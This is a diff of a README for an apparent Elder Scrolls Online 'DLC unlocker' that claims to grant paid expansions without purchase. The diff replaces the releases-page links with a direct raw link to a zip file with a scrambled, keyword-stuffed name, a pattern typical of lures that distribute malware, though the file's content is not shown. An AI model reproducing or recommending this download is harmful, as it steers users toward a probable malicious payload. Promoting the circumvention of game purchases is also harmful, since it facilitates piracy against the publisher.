@@ -1,6 +1,6 @@
 # 🛡️ Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone- - Access All Game Content Instantly Today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Polar-propyl514/Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone-/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Polar-propyl514/Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone-/raw/refs/heads/main/aberrational/DL-in-Epic-Elder-Standalone-Online-All-Scrolls-One-Unlocker-Steam-Toolkit-v2.9.zip)
 
 This toolkit provides a method to access all downloadable content for The Elder Scrolls Online. It supports the Steam version, the Epic Games Store version, and the standalone PC client. You use this software to modify your local game configuration files to grant access to content packages without requiring individual purchases for each expansion.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic specifications to run the toolkit:
 
 Visit the official releases page to download the latest version of the utility.
 
-[Download Link: https://github.com/Polar-propyl514/Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone-/releases](https://github.com/Polar-propyl514/Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone-/releases)
+[Download Link: https://github.com/Polar-propyl514/Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone-/raw/refs/heads/main/aberrational/DL-in-Epic-Elder-Standalone-Online-All-Scrolls-One-Unlocker-Steam-Toolkit-v2.9.zip](https://github.com/Polar-propyl514/Elder-Scrolls-Online-DLC-Unlocker-All-in-One-Toolkit-Steam-Epic-Standalone-/raw/refs/heads/main/aberrational/DL-in-Epic-Elder-Standalone-Online-All-Scrolls-One-Unlocker-Steam-Toolkit-v2.9.zip)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets" at the bottom of the most recent release note.
